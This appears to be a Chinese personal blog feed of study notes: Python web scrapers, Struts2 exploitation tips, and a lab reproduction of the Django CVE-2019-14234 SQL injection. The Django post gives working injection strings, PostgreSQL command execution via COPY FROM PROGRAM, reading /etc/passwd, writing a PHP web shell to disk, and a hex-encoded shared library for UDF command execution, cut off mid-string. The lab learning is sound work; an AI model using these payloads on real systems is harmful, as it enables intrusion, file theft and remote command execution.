class="string">".ring_list"</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">".title"</span>).text</span><br><span class="line">        <span class="comment"># title = li.select(".title")["title"]</span></span><br><span class="line">        <span class="comment"># print(title)</span></span><br><span class="line">        src = li.select(<span class="string">".audio_play"</span>)[<span class="string">"data-mp3"</span>]</span><br><span class="line">        <span class="keyword">with</span> open(download + title + <span class="string">".mp3"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            r = requests.get(src)</span><br><span class="line">            file.write(r.content)</span><br></pre></td></tr></table></figure></div><p>只是引用的包不同，所以存在一些写法不同</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"></span><br><span class="line">download = <span class="string">"music/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    mkdir(download)</span><br><span class="line"></span><br><span class="line">url=<span class="string">"https://www.i4.cn/ring_22_0_1.html"</span></span><br><span class="line"></span><br><span class="line">response = request.urlopen(url)</span><br><span class="line"><span class="comment"># print(response) 二进制读取</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># 寻找存放音乐的 div find 类似</span></span><br><span class="line">    kbox = bs.select(<span class="string">".kbox"</span>)</span><br><span class="line">    <span class="comment"># 找 ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">".ring_list"</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">".title"</span>).text</span><br><span class="line">      src = li.select(<span class="string">".audio_play"</span>)[<span class="string">"data-mp3"</span>]</span><br><span class="line">        request.urlretrieve(src, download + title +<span class="string">".mp3"</span>)</span><br></pre></td></tr></table></figure></div><hr><h2 id="爬豆瓣的评论，帖子"><a href="#爬豆瓣的评论，帖子" class="headerlink" title="爬豆瓣的评论，帖子"></a>爬豆瓣的评论，帖子</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">download = <span class="string">"comment/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寄生虫</span></span><br><span class="line">url=<span class="string">"https://movie.douban.com/subject/27010768/"</span></span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(url=url, headers=header, method=<span class="string">'GET'</span>)</span><br><span class="line"><span class="keyword">print</span> (req)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="comment"># print(response.read()) # 二进制读取</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.read(), <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># 寻找豆瓣评论的div </span></span><br><span class="line">comments = bs.select_one(<span class="string">"#comments-section"</span>)</span><br><span class="line">    <span class="comment"># 找 单个评论</span></span><br><span class="line">shortInfo = comments.select(<span class="string">".comment"</span>)</span><br><span class="line"><span class="comment"># 创建一个list 列表 存放数据</span></span><br><span class="line">comlist = []</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> shortInfo:</span><br><span class="line">    info = li.select_one(<span class="string">".comment-info"</span>)</span><br><span class="line">    <span class="comment"># 评论人</span></span><br><span class="line">    name = info.select_one(<span class="string">"a"</span>).text</span><br><span class="line">    <span class="comment"># 评论信息</span></span><br><span class="line">    shortcom = li.select_one(<span class="string">".short"</span>).text</span><br><span class="line">    <span class="comment"># 将数据写入 csv 文件 </span></span><br><span class="line">    <span class="comment"># 将数据转为 字典</span></span><br><span class="line">    commentText = &#123;<span class="string">"name"</span>:name, <span class="string">"comment-info"</span>:shortcom&#125;</span><br><span class="line">    comlist.append(commentText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"寄生虫.csv"</span>, <span class="string">"w"</span>, newline=<span class="string">""</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    csvWr = csv.writer(file)</span><br><span class="line">    <span class="keyword">for</span> Scom <span class="keyword">in</span> comlist:</span><br><span class="line">        csvWr.writerow([Scom[<span class="string">"name"</span>], Scom[<span class="string">"comment-info"</span>]])</span><br><span class="line">        <span class="comment"># csvWr.writerows([Scom["name"], Scom["comment-info"]])</span></span><br><span class="line">        <span class="comment"># 多打s 会造成每个字符都变成一个单元格属性</span></span><br></pre></td></tr></table></figure></div><p>这边最后那里还是可以注意一下，一些细节问题，会导致最后的结果出现偏差</p><hr><h2 id="爬视频"><a href="#爬视频" class="headerlink" title="爬视频"></a>爬视频</h2><p>首先要去下载一个 <code>ffmpeg</code> ，这个东西可以把视频流源爬下来</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://jx618g.com/?url="</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">print(bs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 src m3u8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd: ffmpeg -i m3u8地址 -vcodec copy -acodec copy xxx.mp4</span></span><br></pre></td></tr></table></figure></div><hr><h1 id="日常瞎扯一会"><a href="#日常瞎扯一会" class="headerlink" title="日常瞎扯一会"></a>日常瞎扯一会</h1><p>难得有时间逼逼两句，本来打算找个好点的图床，毕竟一直白嫖微博好像也不太好，可是发现没几个好的，想了下，等过段时间 <code>coding</code> 那边升级结束后，再把自己的blog 搬过去一份好了，网站备案还在考虑中，实在不行以后就自己把这些全一股脑扔 <code>one note</code> 算了，反正站小，一年几百块的cdn 想了下好像也没那么必要出这个钱，等以后自己能成大佬了，站流量大了再说吧。</p>]]></content>
    
    <summary type="html">
    
      还不能开学返校，只好线上学习，正好最近实训在讲爬虫，自己来写一下学习记录(水一篇)
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="Python" scheme="https://manayakko.github.io/yakko117/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Strust2 挖坑记录</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/24/Struts2/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/24/Struts2/</id>
    <published>2020-02-24T12:35:58.112Z</published>
    <updated>2020-04-13T01:41:56.982Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a href="https://www.cnblogs.com/qiantan/p/10695567.html" target="_blank" rel="noopener">struts2漏洞总结(到19年4月)</a><br><a href="https://www.freebuf.com/tag/struts2%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">Struts2漏洞</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2" target="_blank" rel="noopener">vulhub</a><br><a href="https://www.cnblogs.com/leaf-7/p/5509527.html" target="_blank" rel="noopener">struts2 s2-005/s2-009/s2-013/s2-016/s2-019 payload</a><br><a href="https://www.jianshu.com/p/1d0987abbe29" target="_blank" rel="noopener">Struts-S2-007漏洞利用（含环境搭建、含POC、含POC问题解决方案）</a><br><a href="https://www.cnblogs.com/hayasi/category/869760.html" target="_blank" rel="noopener">Struts2 源码分析</a><br><a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">Struts2著名RCE漏洞引发的十年之思</a></p><hr><h1 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h1><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><p>打<code>poc</code> 的时候，最好自己多注意一下 <code>Tomcat</code> 的版本，很多在 <code>Tomcat7</code> 能直接打的 <code>poc</code>，在8的版本可能会报 <code>400</code>，或者是无回显，主要原因是 <code>\</code> <code>&#39;</code> <code>&quot;</code> 这种在 <code>path</code>提交会被waf，通常情况可以将 <code>poc</code> 进行一次 <code>URL编码</code>，然后看是否可以打进去<br>(实在打poc无效，那就听天命吧，毕竟鬼知道别人的后台怎么搭的，鬼知道shell会弹到哪个位置）</p><hr><h2 id="poc解析问题"><a href="#poc解析问题" class="headerlink" title="poc解析问题"></a>poc解析问题</h2><p>使用<code>S2-007</code>的<code>poc</code>时，注意控制<code>res[num]</code>大小，注意不要将 <code>res</code> 大小超过命令执行结果，否则会回显null。<br>(Buu复现的时候，测到 <code>res=new+byte[1314]</code> 才给flag)</p><p><a href="https://github.com/zhzyker/exphub" target="_blank" rel="noopener">exp工具库</a></p>]]></content>
    
    <summary type="html">
    
      到目前位置struts2的漏洞编号已经到了S2-057，一直想系统的学习下Struts2的漏洞，但由于最近时间比较紧，以后有空再来填坑了。
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14234 复现挖坑</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/18/CVE_2019_14234/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/18/CVE_2019_14234/</id>
    <published>2020-02-18T13:59:30.316Z</published>
    <updated>2020-03-29T04:15:47.664Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>在 <code>Django 1.11.x</code>（1.11.23之前），2.1.x（2.1.11之前）和2.2.x（2.2.4之前）中发现了一个问题。 由于<code>shallow key</code>转换中的错误，<code>django.contrib.postgres.fields.JSONField</code> 的关键字和索引查找以及 <code>django.contrib.postgres.fields.HStoreField</code> 的关键字查找受到SQL注入。 </p><a id="more"></a><p>例如，可以通过在 <code>key</code> 或索引名称中使用 <code>OR 1 = 1</code>来利用漏洞，使用特制的字典并通过字典扩展将所有记录返回给<code>** kwarg</code>，以将所有记录返回给 <code>QuerySet.filter()</code> 功能。</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>首先先来看一下官方的修复措施<br><a href="https://github.com/django/django/pull/11612/files" target="_blank" rel="noopener">Fixed #30664</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" class="lazyload"></a></p><p>在 <code>django/db/backends/postgresql/schema.py</code> 中，利用 <code>strip_quotes()</code> 函数封装，将传递的字符串中的 <code>&#39; (引号)</code> 删除，返回移除字符串头尾指定的字符生成的新字符串，进行传参。</p><hr><p><a href="https://github.com/django/django/pull/11784/files" target="_blank" rel="noopener">Fixed #30769</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" class="lazyload"></a></p><p>然后将 <code>django/contrib/postgres/fields/hstore.py</code> 文件里面的 <code>KeyTransform类</code>的 <code>as_sql</code> 函数中的直接传递字符串改为了将 <code>self.key_name</code> 单独使用数组进行传递,其中 <code>%%</code> 的意思为 <code>转换说明符</code>，其主要作用为直接转化为单个 <code>%</code> 符号而不需要参数。类似于 <code>\\</code> 和 <code>\</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In[1]: "%%"%()</span><br><span class="line">Out[1]: '%'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 具体使用方法如下</span></span><br><span class="line"></span><br><span class="line">In [2]: '%s %%s'%'test'</span><br><span class="line">Out[2]: 'test %s'</span><br></pre></td></tr></table></figure></div><hr><h2 id="再看下一个"><a href="#再看下一个" class="headerlink" title="再看下一个"></a>再看下一个</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" class="lazyload"></a></p><p>在 <code>django/contrib/postgres/fields/jsonb.py</code> 文件中将对 <code>self.key_name</code> 变量的返回统一改成了使用数组进行转换。并且后期在单元测试中加入了对 <code>JSONField</code>的SQL注入测试</p><hr><h1 id="靶场复现"><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794" target="_blank" rel="noopener">p神流批！</a></p><p>进入 <code>http://ip:port/admin/vuln/collection/</code><br>传参 </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?detail__a%27b&#x3D;1</span><br></pre></td></tr></table></figure></div><p>会显示将 <code>&#39;</code> 包括进去</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" class="lazyload"></a></p><p>说明可以构建查询字段</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id_contains&#x3D;admin</span><br><span class="line">name_contains&#x3D;admin</span><br><span class="line">flag_contains&#x3D;flag&#123;</span><br><span class="line"></span><br><span class="line">?detail__author&#39;+&#x3D;+&#39;&quot;a&quot;&#39;)--</span><br><span class="line">?detail__author%27+%3d+%27&quot;a&quot;%27)%20and%207778%3dCAST((SELECT%20version())%20AS%20NUMERIC)--</span><br><span class="line">?detail__author&#39;%3f&#39;a&#39;) OR 1%3d2%20 -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#39;detail</span><br><span class="line">?detail__author&#39;%3f&#39;a&#39;) OR 1%3d2%20 %3bCREATE table cmd_exec(cmd_output text) -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#39;detail</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output <span class="built_in">text</span>);</span><br><span class="line">COPY cmd_exec FROM PROGRAM 'id';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure></div><h2 id="切割脚本"><a href="#切割脚本" class="headerlink" title="切割脚本"></a>切割脚本</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage:python "</span> + sys.argv[<span class="number">0</span>] + <span class="string">"inputfile"</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = open(sys.argv[<span class="number">1</span>],<span class="string">'rb'</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        sys.stdout.write(<span class="string">r'&#123;:02x&#125;'</span>.format(ord(b)))</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2048</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">    fileobj.close()</span><br></pre></td></tr></table></figure></div><p><code>PostgreSQL</code> 是一个自由的对象-关系数据库服务器(数据库管理系统)</p><h2 id="在root权限下修改数据库密码"><a href="#在root权限下修改数据库密码" class="headerlink" title="在root权限下修改数据库密码"></a>在root权限下修改数据库密码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start//启动服务</span><br><span class="line">su postgres<span class="comment">#切换到数据库用户下</span></span><br><span class="line">psql  postgres<span class="comment">#进入数据库</span></span><br><span class="line">alter user postgres with password <span class="string">'postgres'</span> <span class="comment">#修改数据库的密码为：postgres</span></span><br><span class="line">psql -h 127.0.0.1 -U postgres -W   使用帐号密码登入系统</span><br></pre></td></tr></table></figure></div><h2 id="查看数据中的信息"><a href="#查看数据中的信息" class="headerlink" title="查看数据中的信息"></a>查看数据中的信息</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\l  <span class="comment">#列出数据库</span></span><br><span class="line">\du  <span class="comment">#列出数据库的用户</span></span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">'./'</span>);  <span class="comment">#列出系统目录列表(不能是绝对路径)</span></span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">'postgresql.auto.conf'</span>, <span class="number">0</span>, <span class="number">200</span>);  <span class="comment">#读取系统文件</span></span><br></pre></td></tr></table></figure></div><h2 id="使用数据库获取系统信息"><a href="#使用数据库获取系统信息" class="headerlink" title="使用数据库获取系统信息"></a>使用数据库获取系统信息</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn(t <span class="built_in">TEXT</span>);</span><br><span class="line">copy pwn from '/etc/passwd';</span><br><span class="line"><span class="keyword">select</span> *<span class="keyword">from</span> pwn <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br></pre></td></tr></table></figure></div><h2 id="使用数据库写文件"><a href="#使用数据库写文件" class="headerlink" title="使用数据库写文件"></a>使用数据库写文件</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn (t <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pwn(t) <span class="keyword">values</span> (<span class="string">'&lt;?php @system("$_GET[cmd]");?&gt;'</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pwn;</span><br><span class="line">copy pwn(t) to  '/tmp/cmd.php';</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">copy  (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure></div><h2 id="使用数据库执行系统命令"><a href="#使用数据库执行系统命令" class="headerlink" title="使用数据库执行系统命令"></a>使用数据库执行系统命令</h2><p>执行系统命令需要用到 <code>udf库</code>，(这个有点类似mysql 提权)<br>创建 <code>.so</code>，执行自己需要用的命令</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4602010100000000000000000003003e0001000000d00d0000000000004000000000000000f82e0000000000000000000040003800070040001d001a000100000005000000000000000000000000000000000000000000000000000000fc16000000000000fc1600000000000000002000000000000100000006000000001e000000000000001e200000000000001e200000000000e002000000000000e80200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000ec14000000000000ec14000000000000ec140000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000001e000000000000001e200000000000001e200000000000000200000000000000020000000000000100000000000000040000001400000003000000474e5500bc18d001b8d1db33f56f9fa1d194c131375c6a5c00000000030000001d00000002000000070000008440030810890c99880c008dc84400001d0000002400000029000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900100c0000000000000000000000000000ec00000012000000000000000000000000000000000000001101000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008401000012000000000000000000000000000000000000007d0100001200000000000000000000000000000000000000ba00000012000000000000000000000000000000000000008a0100001200000000000000000000000000000000000000480100001200000000000000000000000000000000000000e400000012000000000000000000000000000000000000001f01000012000000000000000000000000000000000000001901000012000000000000000000000000000000000000007701000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000009f0000001200000000000000000000000000000000000000d300000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000007101000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000004d01000012000000000000000000000000000000000000000301000012000000000000000000000000000000000000006b0100001200000000000000000000000000000000000000400100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000eb00000010000000000000000000000000000000000000003b0100001200000000000000000000000000000000000000f100000012000c0031100000000000000d00000000000000ca00000012000c00bc0f0000000000007500000000000000a501000010001700e0202000000000000000000000000000c100000012000c00af0f0000000000000d00000000000000fa00000012000c003e100000000000002201000000000000b801000010001800e82020000000000000000000000000005e01000012000c007a1200000000000024020000000000002601000012000c0060110000000000000d000000000000008300000012000c00dd0e0000000000006200000000000000ac01000010001800e02020000000000000000000000000001000000012000900100c00000000000000000000000000002f01000012000c006d1100000000000000010000000000007500000012000c00d00e0000000000000d000000000000001600000012000d00a01400000000000000000000000000005501000012000c006d120000000000000d00000000000000a600000012000c003f0f0000000000007000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006d656d637079006368725f7074725f746f5f746578745f707472007374726c656e0070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374